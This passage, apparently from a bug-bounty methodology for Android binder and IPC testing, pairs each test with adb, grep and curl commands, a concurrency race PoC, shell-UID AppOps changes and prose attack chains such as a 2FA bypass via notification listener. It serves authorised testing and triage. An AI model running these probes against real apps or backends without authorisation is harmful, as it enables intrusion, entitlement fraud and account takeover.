grep -rnE 'MediaCodec|ImageDecoder|BitmapFactory|ZipInputStream|System\.loadLibrary' out/sources/
adb shell ps -AZ | grep -E 'isolated_app|com.target.app'
```
- **Proof:** `ps -AZ` showing the parsing work in `u:r:untrusted_app:s0` (one process, full app
  permissions) rather than `u:r:isolated_app:s0:c…`, while the app ingests attacker-supplied files. Verify
  with `ps -AZ`, not with the manifest alone.
- **Escalation:** This is the honest **downgrade** for a memory-corruption finding in a parser that runs
  isolated, and the honest **upgrade** argument when the same parser runs in the app domain — a
  main-process parser bug is app compromise. → D16.
- **Ruled out when:** `ps -AZ` shows the parser in `isolated_app` while it handles the untrusted input —
  record the SELinux context string in the ruled-out register.

### D06-068 · Binder domains and vendor interfaces are not app-reachable — the false-positive gate

| | |
|---|---|
| **Severity ceiling** | Support — Medium as an OEM-VRP report for the `@VintfStability` variant |
| **VRT** | n/a — this gate stops an over-rated report |
| **Attacker** | n/a |
| **Applies to** | Android 8+ (multiple binder contexts, introduced with Treble); the AIDL-HAL variant is Android 11+ and OEM/vendor images only |
| **Maps to** | AOSP "Binder IPC": `/dev/binder` = framework/app AIDL, `/dev/hwbinder` = framework↔vendor and vendor↔vendor HIDL, `/dev/vndbinder` = vendor↔vendor AIDL with its own `vndservicemanager`; contexts are isolated so "binder nodes passed through a specific context are accessible only within that same context"; `ProcessState::initWithDriver("/dev/vndbinder")`. AOSP "AIDL for HALs": `@VintfStability` + `stability: "vintf"`; `vts_treble_vintf_vendor_test` verifies frozen interfaces "are frozen at a known released version… both sides of the interface agree on the exact definition". |

- **Test:** Apps talk on `/dev/binder` **only**. A "vulnerability" in a HIDL or vendor-AIDL HAL is an
  app-level finding only if there is a framework service on `/dev/binder` that proxies to it — prove the
  proxy path before rating anything. The related OEM case: a `@VintfStability` interface shipped unfrozen
  or locally modified is a version-mismatch surface, but it is not an app finding unless you can drive it
  from an app.
- **How:**
```bash
adb shell ls -lZ /dev/binder /dev/hwbinder /dev/vndbinder
adb shell lshal 2>/dev/null | head                 # hwbinder registrations
adb shell service list | grep -i <hal-name>        # is there an app-reachable framework proxy?
adb shell dmesg | grep -i 'avc.*vndbinder'
adb shell cat /vendor/etc/vintf/manifest.xml | grep -A4 '<hal format="aidl"'
```
- **Proof:** A framework service name in `service list` for which `getService()` returns non-null from the
  app's UID, and whose decompiled code forwards to the vendor HAL. Absent that, record the surface as
  **not app-reachable** in the ruled-out register. For the OEM variant: a `<version>` in the device
  manifest that does not exist in AOSP's frozen API directory for that interface, or a
  `vts_treble_vintf_vendor_test` failure.
- **Escalation:** → D25 when a proxy exists; → D17 for the parcel-mismatch consequence of a drifted
  interface.
- **Ruled out when:** `service list` contains no framework proxy for the HAL, or `getService()` returns
  null from an app UID — this is the mechanism, and it is the whole point of the item.

### D06-069 · Binder threadpool re-entrancy — check-then-act races, proved statistically

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) when the race duplicates a ledger entry |
| **Attacker** | AM-03 |
| **Applies to** | All |
| **Maps to** | `guide/components/processes-and-threads` — "`IBinder` methods execute in a thread pool, not the UI thread"; ContentProvider `query/insert/delete/update/getType` "are called from a pool of threads… must be implemented as thread-safe"; AOSP "Binder threading" (per-process shared threadpool, reentrancy on the same binder thread for nested calls) |

- **Test:** Incoming binder calls are dispatched on a pool of threads. Any service that validates and then
  acts on shared mutable state without synchronisation is racey from a remote attacker who simply calls
  concurrently — a double-redeem, double-spend or duplicate-grant.
- **How:**
```bash
grep -rnE 'class .*\$Stub|public .* onTransact' out/sources/ -A5 | grep -vE 'synchronized|AtomicReference|ReentrantLock|Mutex'
```
```java
ExecutorService ex = Executors.newFixedThreadPool(32);
for (int i = 0; i < 5000; i++) { final int k = i; ex.submit(() -> svc.redeem(k % 2 == 0 ? "valid" : "other")); }
```
- **Proof:** **A distribution, not an outlier.** Run at least 10 interleaved trials per group (control and
  test, randomised order, not back-to-back) and report mean, median and σ per group; a signal requires the
  suspect group's mean to sit ≥ 2σ from the control's. For a redeem race the cleaner proof is the ledger:
  the count of granted entitlements exceeding the intended single grant, shown in the app's own database
  or in the backend response. One lucky double-grant is not a finding.
- **Escalation:** → D23 (entitlement or payment fraud), → D15 (the backend race the service exposes).
- **Ruled out when:** The check-then-act region is `synchronized` (or uses an atomic compare-and-set, or a
  database unique constraint), and 100+ concurrent attempts produce exactly one grant — state the attempt
  count in the ruled-out register.

### D06-070 · Local socket or localhost HTTP server bound by the app without authentication

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when bound to `0.0.0.0` and serving data or commands to the LAN; `broken_access_control.privilege_escalation` (null) for localhost-only |
| **Attacker** | AM-03 for localhost; **AM-06** for a `0.0.0.0` bind |
| **Applies to** | All. Frequently a leftover from React Native / Flutter debug tooling — cross-check D19. |
| **Maps to** | MASWE-0018 mode "Binding a local web service or open port that accepts connections without authentication" (CWE-306, CWE-749); MASTG-TECH-0028 (Get Open Connections); MASVS-PLATFORM-1; Mobile Top 10 2024 M3/M8 |

- **Test:** Debug bridges, RN dev servers, WebView-backing local servers and SDK IPC channels all bind
  sockets. Any app on the device — and, when bound to `0.0.0.0`, anything on the LAN — can reach them.
- **How:**
```bash
adb shell "cat /proc/net/tcp /proc/net/tcp6 /proc/net/unix" | head -60
adb shell ss -lntp 2>/dev/null
adb shell ps -A -o PID,UID,NAME | grep com.target.app          # map the socket to the app's UID
adb shell curl -s -i http://127.0.0.1:<port>/                  # adb shell is a different UID
adb shell "echo hello | nc 127.0.0.1 <port>"
grep -rnE 'new ServerSocket\(|LocalServerSocket\(|NanoHTTPD|ktor|embeddedServer|0\.0\.0\.0' out/sources/
```
- **Proof:** A response from the port obtained by a process running as a different UID, returning app data
  or accepting a state-changing command. A bind to `0.0.0.0` rather than `127.0.0.1` widens this to the
  whole LAN — capture `nc -v <device-ip> <port>` from a second host as the evidence.
- **Escalation:** A localhost server reachable from a WebView (D10) is scriptable by any page the WebView
  loads, converting it into a remote primitive.
- **Ruled out when:** `/proc/net/tcp` shows the listener bound to `0100007F` (127.0.0.1) **and** every
  request requires a token the app generated at runtime and never wrote to a world-readable location —
  prove by connecting without the token and getting a rejection whose body differs from the success body.

### D06-071 · Shell-backed binder brokers (Shizuku-class) as an assumed-privilege path

| | |
|---|---|
| **Severity ceiling** | High — as a fleet/MDM finding; as an app finding, only when the app itself exposes such a broker or trusts state a broker can forge |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-04 (the user completes the pairing flow) |
| **Applies to** | Android 11+ (wireless debugging pairing). Boundaries still apply: shell cannot read `/data/user/0/<pkg>`, and shell permissions are trimmed by release and by OEM. |
| **Maps to** | HackTricks `shizuku-privileged-api.md`; ATT&CK T1626 (Abuse Elevation Control Mechanism) |

- **Test:** Whether the target app, or any app on a managed fleet, brokers privileged binder calls through
  an ADB/shell-backed service. That is ADB-equivalent privilege with no root and no USB cable.
- **How:**
```bash
adb shell service list | grep -i shizuku
adb shell dumpsys activity service moe.shizuku.privileged.api | head
# from the broker shell
./rish ; id            # uid=2000(shell) … context=u:r:shell:s0
cmd appops set com.target.app SYSTEM_ALERT_WINDOW allow
cmd connectivity set-package-networking-enabled false com.example.agent
```
- **Proof:** A shell-UID binder helper spawned from an app workflow; `Shizuku.getUid()` returning `2000`
  (shell backend) or `0` (root backend); AppOps or per-package networking changed from inside an app
  process.
- **Escalation:** The malicious variant chains Accessibility → Settings → enable wireless debugging →
  scrape the pairing code from the UI tree → pair to `127.0.0.1` → spawn a UID-2000 helper over binder.
  Detection signals worth reporting to a fleet owner: accessibility-driven taps on "Build number", an
  `APPLICATION_DEVELOPMENT_SETTINGS` launch, local ADB TLS/SPAKE2 to `127.0.0.1`, silent
  `WRITE_SECURE_SETTINGS` grants, and `BOOT_COMPLETED` receivers restoring debugging state.
- **Ruled out when:** The app neither exposes such a broker nor makes a trust decision on any state a
  shell-UID process can set (AppOps, secure settings, package-networking state) — name the decisions you
  checked.

### D06-072 · Service acting as a network proxy or registering a `VpnService`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) for the redirected traffic |
| **Attacker** | AM-06 for a LAN-reachable listener; AM-09 for the VPN case |
| **Applies to** | All |
| **Maps to** | ATT&CK T1604 (Proxy Through Victim — "On Android specifically, attackers can use the `Proxy` API to establish SOCKS proxy connections or interact with raw sockets directly"; Exobot S0522 "can open a SOCKS proxy connection through the compromised device"); T1638 (Adversary-in-the-Middle — "a malicious application may register itself as a VPN client, effectively redirecting device traffic to adversary-owned resources"); T1428 (Exploitation of Remote Services); DressCode S0300 "general purpose tunnel"; mitigation M1012 |

- **Test:** Does the app open a listening socket, relay traffic, or register a `VpnService`? Either turns
  the user's device — its IP, and its LAN position — into infrastructure for someone else.
- **How:**
```bash
grep -rnE 'ServerSocket|VpnService|Proxy\(|SOCKS|java\.net\.Proxy|LocalServerSocket|accept\(' out/sources/
aapt2 dump permissions apk/base.apk | grep -E 'BIND_VPN_SERVICE|INTERNET'
adb shell "cat /proc/net/tcp /proc/net/tcp6" | awk '{print $2,$4,$8}' | sort -u
adb shell dumpsys connectivity | grep -i vpn
```
- **Proof:** A LISTEN socket owned by the app's UID reachable from another host on the same network
  (`nc -v <device-ip> <port>` succeeding), or the VPN key icon active with the app named in
  `dumpsys connectivity`.
- **Escalation:** A listening socket on a corporate-managed handset is a lateral-movement foothold; the
  mitigation to recommend is M1012 per-app VPN. Traffic attribution and abuse takedowns are the business
  impact to state.
- **Ruled out when:** No socket is in LISTEN state on a non-loopback address for the app's UID, and no
  `VpnService` is declared — attach the `/proc/net/tcp` capture as the negative's evidence.

### D06-073 · Remote-support / screen-share module embedded as a service

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when a session can be started or joined without per-session user consent |
| **Attacker** | AM-01 / AM-02 depending on how a session is initiated |
| **Applies to** | All. `MediaProjection` requires a user-consent dialog per session — verify the app does not cache or reuse the projection token beyond its session. |
| **Maps to** | ATT&CK T1663 (Remote Access Software — names "VNC, TeamViewer, AirDroid, AirMirror" and notes such software "typically requires many privileged permissions, such as accessibility services or device administrator"), T1513 (Screen Capture), T1516 (Input Injection); mitigation M1012 |

- **Test:** Does the app embed screen-sharing or remote-control functionality — a VNC/agent SDK, a support
  module that streams the screen or accepts remote input? These need the highest-risk permissions on the
  platform, and the interesting question is the **authorisation of the session**, not its existence.
- **How:**
```bash
grep -rn -iE 'vnc|rfb|teamviewer|airdroid|airmirror|cobrowse|screenshare|remote.?control|MediaProjection|dispatchGesture|injectInputEvent' out/sources/
aapt2 dump permissions apk/base.apk | grep -E 'BIND_ACCESSIBILITY_SERVICE|SYSTEM_ALERT_WINDOW|FOREGROUND_SERVICE_MEDIA_PROJECTION'
adb shell dumpsys media_projection
```
- **Proof:** A running session in which the remote side both sees the screen and injects a tap — record
  both ends. Then test the authorisation: can a session be initiated or joined without explicit
  per-session user consent (a guessable session code, a server-initiated start, a reused projection
  token)?
- **Escalation:** Remote view plus remote input equals full in-app account takeover with the user's own
  device doing the work; rate on the most sensitive action reachable in-session.
- **Ruled out when:** Every session requires a fresh, user-visible consent (the `MediaProjection` dialog
  plus an in-app confirmation) and the session code has adequate entropy — measure it, do not eyeball it.

### D06-074 · Cast / remote-playback session as an unauthenticated control and content channel

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the cast payload carries a reusable account token; `broken_access_control.privilege_escalation` (null) for a signed-URL entitlement bypass |
| **Attacker** | AM-06 (same LAN) |
| **Applies to** | Apps integrating the Google Cast SDK or remote playback |
| **Maps to** | No external identifier verified in this session — cite the captured traffic, not a standard. |

- **Test:** Cast-enabled apps hand a receiver device a media URL and, frequently, an auth token or signed
  URL in `MediaInfo` custom data. Two questions: does that payload carry a bearer token or long-lived
  signed URL to a device on the LAN in the clear, and can a same-network party enumerate or hijack the
  session?
- **How:**
```bash
grep -rnE 'CastContext|SessionManager|RemoteMediaClient|MediaInfo\.Builder|setCustomData|CastOptions|setReceiverApplicationId' out/sources/
tcpdump -i any -s0 -w cast.pcap 'port 8008 or port 8009 or port 5353'
tshark -r cast.pcap -Y 'mdns || tcp.port==8009' -T fields -e _ws.col.Info
```
- **Proof:** The captured payload (or a `RemoteMediaClient` log) containing a bearer token or signed URL
  that **still authenticates when replayed with `curl` from off-device** — that replay is the finding, not
  the capture.
- **Escalation:** A token on the LAN is a full D13 session-theft primitive; a long-TTL signed URL is a D23
  entitlement bypass.
- **Ruled out when:** The cast payload carries only short-lived, single-use, device-bound URLs — replay
  one from another host and show it rejected.

### D06-075 · THE LAYER-ORDERING TRAP, binder edition — an argument error does not prove you passed the caller check

| | |
|---|---|
| **Severity ceiling** | Support — a kill gate on every authorisation-bypass claim in this domain |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | **Every** auth-bypass claim in this chapter, and every APK-derived HTTP endpoint the service calls |
| **Maps to** | `triage-validation` "THE LAYER-ORDERING TRAP"; CVE-2026-0047 ("Phase 1: Confirming the Bug") for the binder-side oracle |

- **Test:** The single highest-confidence false positive in the whole auth-bypass class. On the wire, many
  stacks run a body parser or sanitiser **in front of** the auth middleware, so a malformed body is
  rejected before auth is ever consulted and the response is indistinguishable from "auth passed,
  validation failed". The binder analogue is exact: `Stub.onTransact` unmarshals every argument from the
  `Parcel` **before** dispatching to your method, so a `BadParcelableException`, `IllegalArgumentException`
  or `NullPointerException` raised in `onTransact` itself tells you only that your parcel was malformed —
  the permission check may sit immediately after, untouched.
- **How:** Re-test with a **minimal well-formed** call. On the binder side, read the frame the exception
  came from:
```bash
adb shell service call <svc> <code>            # garbage args
# inspect the Parcel's stack trace: which frame raised?
#   ...at IFoo$Stub.onTransact(IFoo.java:NNN)      -> unmarshalling, proves nothing
#   ...at FooService.doThing(FooService.java:NNN)  -> METHOD BODY EXECUTED, no check ran
```
  On the HTTP side of whatever the service calls:
```bash
curl -s -X POST https://target/api/v1/resource -d '{'
# 400 "Invalid text. Only permitted characters are allowed"   <- looks like an auth bypass
curl -s -X POST https://target/api/v1/resource -H 'Content-Type: application/json' -d '{}'
# 401 "Not authenticated. Please log in."                     <- this is where auth actually sits
```
- **Proof:** The *frame* the exception was raised in, not the exception class. An error naming **input
  shape or character class** means you are talking to a parser; an error naming a **domain field**, with a
  well-formed minimal body, is real signal.
- **Escalation:** n/a — this is a kill gate. It prevents a false Critical against a production service.
- **Ruled out when:** The exception frame is inside the service method (or the well-formed `{}` still
  returns the domain error) — then the bypass claim stands and you proceed.

### D06-076 · Shadow API — the bound service is a bridge to an older backend version

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the old version accepts no token; `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for a field-exposure regression |
| **Attacker** | AM-01 (against the backend) reached via AM-03 (against the service) |
| **Applies to** | Any versioned API — and the app's hardcoded calls are the number-one source of old-version endpoints |
| **Maps to** | `hunt-shadow-api` Stages 1 & 3 and its severity table |

- **Test:** A mobile app's hardcoded backend calls are frequently an **older API version** than the current
  web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. An
  exported service that proxies those calls hands you the old version *and* the victim's credentials in
  one step. **The bug is the delta, not the version.**
- **How:** Extract every host and path the service reaches, then diff behaviourally against the current
  web API for the **same operation**:
```bash
grep -rnE 'https?://[A-Za-z0-9.-]+/[A-Za-z0-9/._-]*' out/sources/ | grep -oE 'https?://[^"'"'"']+' | sort -u > recon/app-endpoints.txt
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done
curl -s -H "X-API-Version: 1" "https://$TARGET/api/users"
curl -s -H "Accept: application/vnd.company.v1+json" "https://$TARGET/api/users"
```
  Diff four security-relevant behaviours between old and current: auth strength (does v1 accept no token,
  an expired token, or a lower-privilege token that v2 rejects?), rate limiting (burst both; a missing 429
  on v1 means throttling was never backported), input validation (same oversized/injection payload to
  both), and field exposure (does v1 return internal ids or PII the current version redacts?).
- **Proof:** A security regression on the old path, demonstrated with the same request against both
  versions side by side. **A version difference alone is Informational — the weakened control is the
  finding.**
- **Escalation:** → D15 for the full backend workup; the service is the delivery vehicle, the backend
  regression is the report.
- **Ruled out when:** Every app-derived endpoint behaves identically to the current web API on all four
  axes, tested with the same request and the same account — record the four comparisons.

### D06-077 · Confirm the SELinux domain before claiming an escalation `untrusted_app` cannot perform

| | |
|---|---|
| **Severity ceiling** | Support — report-accuracy control |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | Android 5.x+ (SELinux enforcing for all userspace); Android 9+ for the per-app SELinux sandbox at targetSdk ≥ 28 |
| **Maps to** | source.android.com SELinux concepts (contexts, `permissive=0` meaning enforcing) and device-policy (the note that excluding `untrusted_app` from a rule is "trivial to work around because all apps may optionally run services in the `isolated_app` domain" — which cuts both ways, since `isolated_app` is strictly weaker) |

- **Test:** Before writing "the attacker then gains root" or "then reads another app's data directory",
  confirm the SELinux policy permits it. Per-app MLS categories mean app A's `c168,…` cannot touch app B's
  files, and no amount of binder access changes that.
- **How:**
```bash
adb shell ps -Z | grep com.poc.attacker        # expect u:r:untrusted_app:s0:c…,c…
adb shell dmesg | grep 'avc: '                 # what actually got denied during the PoC
adb logcat -b all | grep 'avc: '
```
- **Proof:** An AVC line of the documented shape —
  `avc: denied { read write } for pid=8821 comm="poc" scontext=u:r:untrusted_app:s0 tcontext=… tclass=file permissive=0`
  — proving the step you were about to claim did not happen. Conversely, the **absence** of an AVC denial
  plus successful data return proves the step did.
- **Escalation:** None — it prunes invalid chains before they reach the report, which is the highest-value
  thing this item does.
- **Ruled out when:** The claimed step produced no AVC denial and returned the data, recorded with the
  `dmesg` capture taken during the PoC run.

### D06-078 · Marker discipline and the body-diff rule for binder returns

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | Every "the service returned my data" and "the service consumed my input" claim |
| **Maps to** | `bb-methodology` PART 4 (Marker Discipline, Body-Diff Rule) |

- **Test:** Two failure modes specific to this domain. (a) **Reflection false positives:** you put a value
  in a `Bundle`, see it in a log line, and conclude the service consumed it — when the string was already
  there. (b) **Non-differential returns:** you get a populated `Bundle` back from an unprivileged bind and
  call it a leak, when a caller with no permission could obtain the same content from a public API.
- **How:** Use a random alphanumeric marker of **8+ characters** with no English words and no protocol
  keywords — never `test`, `marker`, `evil`, `attacker`, `payload`, `AAAA`, or your own domain. Good:
  `cpmark987abc`, `x4hd2k9pq`. **Search the baseline for the marker before claiming anything:**
```bash
adb logcat -c
adb shell am startservice -n com.target.app/.SyncService --es note "x4hd2k9pq"
adb logcat -d > with-marker.txt
adb logcat -c && adb shell am startservice -n com.target.app/.SyncService && adb logcat -d > baseline.txt
grep -c 'x4hd2k9pq' baseline.txt      # MUST be 0
diff baseline.txt with-marker.txt
```
  For returns, diff the bytes:
```bash
diff <(xxd unprivileged-return.bin) <(xxd legitimate-return.bin)
```
- **Proof:** The marker present in the test artefact and **absent from the baseline**; and, for a
  disclosure claim, a byte-level diff showing the unprivileged return contains content the legitimate
  low-privilege path does not. A byte-identical return is not a leak.
- **Escalation:** n/a — it protects every other item's evidence.
- **Ruled out when:** The marker appears in the baseline (word collision — the claim dies), or the
  privileged and unprivileged returns are byte-identical.

### D06-079 · Evidence hygiene for a service-driven state change

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | Every state-change finding in this chapter (credential overwrite, entitlement flip, service stop, file drop) |
| **Maps to** | `evidence-hygiene` §§2, 4, 5, 6, 7, 8 |

- **Test:** A state change needs pre-state, the bug, and post-state — plus the out-of-band side effect.
  Five artefacts, taken in one sitting, filenames `{finding-#}-step{n}-{description}.png`:
  (1) pre-state verification (the old PIN still works; the file is absent; the service is running);
  (2) **the bug itself** — the binder call succeeding from the zero-permission PoC, with the PoC's
  manifest visible; (3) post-state negative (the old value no longer works); (4) post-state positive (the
  attacker's value works); (5) the side effect (the request at your collaborator, the file in the victim's
  directory, the inbox).
- **How:** Capture the PoC app's identity alongside every step:
```bash
adb shell dumpsys package com.poc.attacker | sed -n '/requested permissions/,/install permissions/p'
adb shell dumpsys package com.poc.attacker | grep -E 'userId=|pkgFlags'
adb logcat -c && <run the PoC> && adb logcat -d > evidence/04-step2-binder-call.txt
```
  Sanitise transcripts, keeping what triage needs:
```bash
sed -E 's/(Bearer )[A-Za-z0-9._-]{20,}/\1<REDACTED>/g; s/("token":")[^"]+/\1<REDACTED>/g' raw.txt > evidence/raw.sanitised.txt
grep -iE 'authorization|"token"|set-cookie' evidence/raw.sanitised.txt | head   # verify
```
  **Leave visible:** trace ids (`x-request-id`, `x-datadog-trace-id`), your own attacker UID and package
  name, JSON key names, transaction codes, method names. **Mask:** token and cookie *values*, the victim
  account's PII. Keep the unredacted originals locally for triager verification through the platform's
  private attachment system — never email.
- **Proof:** Five numbered, cross-referenced artefacts plus the PoC app's manifest in the evidence tree.
- **Escalation:** n/a.
- **Ruled out when:** n/a — this is a deliverable standard, not a test.

### D06-080 · `adb shell` is UID 2000 — re-prove every candidate from a zero-permission app

| | |
|---|---|
| **Severity ceiling** | Support — governs the attacker model of every finding in this chapter |
| **VRT** | n/a |
| **Attacker** | Decides whether you may write AM-03 at all |
| **Applies to** | Every dynamic test in this chapter |
| **Maps to** | `docs/05-attacker-models.md` (AM-03: "Your PoC for this model is a **second app**, not an adb command"); ISSUES.md Phase 5 exit condition |

- **Test:** `adb shell am startservice`, `service call` and drozer all run as UID 2000 (`shell`), which
  holds far more privilege than any real attacker — including, on many builds, permissions no third-party
  app can obtain. Discovery with adb is fine and fast. **A finding proved only by adb has not established
  AM-03**, and a triager who notices will downgrade the whole report.
- **How:** Build one reusable PoC app whose manifest declares **no** `<uses-permission>` at all, signed
  with a throwaway key, containing the regenerated `.aidl` (same package and interface name as the target)
  and a `bindService` call per candidate. Add a `<queries>` entry for the target package when your PoC
  targets SDK 30+ — that is a one-line manifest addition, not a mitigation.
```xml
<manifest package="com.poc.attacker">
  <queries><package android:name="com.target.app" /></queries>
  <application android:label="poc"><activity android:name=".Main" android:exported="true"/></application>
</manifest>
```
```bash
adb install -r poc.apk
adb shell dumpsys package com.poc.attacker | sed -n '/requested permissions/,/User 0/p'   # must be empty
adb shell am start -n com.poc.attacker/.Main
```
- **Proof:** The `dumpsys` output showing an empty requested-permission list, the PoC's manifest in the
  evidence tree, and the privileged result in the PoC's own logcat tag — not in `adb shell` output.
- **Escalation:** n/a — it sets the precondition sentence, which is worth several rating steps.
- **Ruled out when:** The candidate reproduces from adb but **not** from the PoC app. That is a real
  negative and must be recorded as one, naming the permission or platform gate that `shell` held and the
  app did not.

### D06-081 · Severity governance and chain-filing order for binder findings

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — governs the VRT choice for every other item |
| **Attacker** | n/a |
| **Applies to** | Every Critical or High claim arising from this chapter |
| **Maps to** | `triage-validation` PRE-SEVERITY GATE; `bugcrowd-reporting` §§1–3, 5 |

- **Test:** Run the pre-severity gate against the **Critical claim**, not against the bug. Substitute the
  claim into each question: (1) Have I validated the full chain to attacker-attainable impact, or only one
  primitive in the middle — "unauthenticated binder method confirmed" is not "account takeover"? (2) What
  does the attacker walk away with, in one concrete sentence? (3) Have I personally reproduced the full
  chain end to end **at least twice**? (4) Is there still an inheritance gate, signature check or audience
  check gating the chain — if yes it is not Critical, it is "primitive present" at a lower severity?
  (5) Has the programme rejected this severity class before?
- **How:** File in this order, because a consumer report must reference primitive ids that already exist:
  1. Identify the highest-severity chained outcome.
  2. File each primitive separately at its standalone severity — the unauthenticated interface (D06-015),
     the path-traversal write (D06-030), the token disclosure (D06-028) — leaving a placeholder
     cross-reference line.
  3. File the chain consumer with the full ATO/RCE narrative at the chained severity, filling in the real
     primitive ids.
  4. Edit each primitive to backfill the consumer's id.
  Consumer body:
```markdown
## Chain partners (filed as separate reports)
- **submission [UUID-1]** — unauthenticated AIDL interface on com.target.app/.SyncService
- **submission [UUID-2]** — caller-controlled savePath in tryDownload()
These primitives have independent fix surfaces and are filed separately per the programme's
"one fix = one bounty" rule.
```
  Pick the most **specific accurate** VRT node and then set technical severity manually; never pick a node
  that misrepresents the bug to get a higher default. Open the body with the literal heading
  `## Severity request — please review carefully before applying VRT default` and anchor the argument in
  the CVSS vector plus the programme's own focus-area wording.
- **Proof:** Cross-referenced ids in both directions, and a severity-request paragraph as the first body
  section.
- **Escalation:** A chain is a **severity amplifier, not a merge request**. Do not paste the whole chain
  narrative into every primitive, do not claim each primitive is independently P1, and do not file
  everything within minutes of each other — triagers read that as spam.
- **Ruled out when:** n/a. One caveat that is not a rule but its inverse: **do not retract a confirmed
  finding that stopped reproducing because the client patched mid-engagement.** Keep the timestamped
  pre-patch request/response; the difference between a retraction and a preserved Critical is whether you
  have that evidence.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Service X is exported" | An inventory item, not a finding. The entire mobile branch of the VRT is P5 and this is not even in it. Google's own invalid-report guidance says the export is only a finding if it "can be used to gain unauthorized access to application data or functionality". | Reach a privileged action, another user's data, or a non-exported component through it, from a zero-permission PoC app. |
| "`onServiceConnected` fired, so I can bind" — especially on a gRPC-over-binder service | `onBind` succeeds regardless of the `SecurityPolicy`, which rejects at the RPC layer. A successful bind proves reachability, not authorisation. | Complete an RPC and show what it returned, or quote a `permitAll()` / package-name-only policy body. |
| A `SecurityException` on one AIDL method | Proves that one method is gated. Interfaces are asymmetric by default. | Test every method in the table from D06-007 and report the ones with no check. |
| Crash from a malformed parcel or a huge `byte[]` | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**. | Turn it into memory corruption with a demonstrated primitive (→ D16), or show the exception handler fails open (D06-064). |
| A `NullPointerException` returned from `service call` | It proves the method body executed — an oracle, not an impact. On its own it is a probe result. | Build the real parcel and return the data (D06-012), or show the method performs a privileged action. |
| Token or secret found in the WorkManager `WorkSpec` database | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` is **P5**; the UID sandbox already protects it and you read it with root or `run-as`. | Show a zero-permission app reaching it — through an exported upload service (D06-029), a provider (D07), or a backup (D11). The reach is the finding. |
| "The app runs a service in a separate `:remote` process" | A design choice, and usually a *good* one. | The interface that process serves is unguarded (D06-015). |
| "`isolatedProcess` is not set on service Y" | Hardening only. No boundary is crossed. | Pair it with a memory-safety finding in the parser that runs there (→ D16); the absence is the severity amplifier, not the bug. |
| A HIDL / vendor-AIDL HAL weakness reachable from `adb shell` | Apps talk on `/dev/binder` only; `/dev/hwbinder` and `/dev/vndbinder` are separate contexts, and `shell` is not an app. | Prove an app-reachable framework proxy on `/dev/binder` that forwards to it (D06-068), then it is D25. |
| "Root detection in the integrity service is bypassable" | P5 (`lack_of_binary_hardening.lack_of_jailbreak_detection`). Most such services only report signals to a backend — telemetry, not a control. | Show the bypass defeats a control that gates money, DRM or anti-fraud — and if you can *stop* the service from an unprivileged app, report D06-031 instead. |
| "Foreground-service notification discloses the sync endpoint / job name" | Informational disclosure to the device owner, who already sees the notification. | The notification discloses another user's data, or the service accepts a caller-chosen endpoint (D06-028). |
| An exported `JobService` you can bind but whose `onStartJob` ignores your parameters | Reachability with no effect. | The job body consumes `JobParameters.getExtras()` and you can steer it (D06-060). |
| `android:visibleToInstantApps` absent, but you claimed browser reach anyway | Overstated attacker model; it gets the whole report downgraded. | Recheck the attribute. Without it the finding is AM-03, which is still valuable — write it that way. |
| SQL injection inside a provider-backed service that crosses no permission boundary | Google's invalid-reports guidance: "if an application has permissions to read and write contacts and can use SQL injection to read and write contacts, it is not an issue." Samsung's ineligible list says the same. | Show read-only access escalated to write, or data returned that the caller's permissions do not cover. That sentence is the difference between $0 and a valid High. |

## Cross-surface joins

- **D06 × D08 — the binder handle inside a `PendingIntent`'s `Bundle`.** Reviewers check
  `PendingIntent` mutability and they check AIDL caller authorisation, never together. A `Bundle` can
  carry an `IBinder` (`Bundle.putBinder`), and a `PendingIntent` carries a `Bundle`. A service that
  enforces its permission only in `onBind` (D06-024) and an app that hands out a `PendingIntent`
  containing that handle produce a permission-free path to a permission-gated interface — the recipient
  never touches the service's manifest guard at all.
- **D06 × D07 — the `ParcelFileDescriptor` that a provider would never have granted.** Provider review
  covers `grantUriPermissions`, path traversal and `openFile`. Binder review covers method authorisation.
  Nobody checks that an AIDL method returns an FD onto a file the provider deliberately does not expose
  (D06-065). The FD carries the mode it was opened with and bypasses every URI-grant control the app
  designed — including a writable handle into the directory D06-030 needs.
- **D06 × D13 — the `NotificationListenerService` that reads the OTP the service just triggered.** The
  auth review tests the OTP flow; the IPC review tests the listener. Join them: use an exported service or
  a `Messenger` code (D06-032) to *trigger* the OTP send, then read the code with the listener (D06-048),
  then cancel the notification so the victim never sees it. That is a complete 2FA bypass built entirely
  from components each of which is individually "low".
- **D06 × D15 — the bound service as a shadow-API bridge.** The backend tester works from the web app's
  current API version; the mobile tester works from the manifest. The service's hardcoded endpoint is
  frequently an older version with weaker auth and more field exposure (D06-076) — and the service will
  call it *with the victim's credentials attached* (D06-028). The join is: enumerate the service's
  endpoints, diff them behaviourally against the web API, and drive the weaker one through the service.
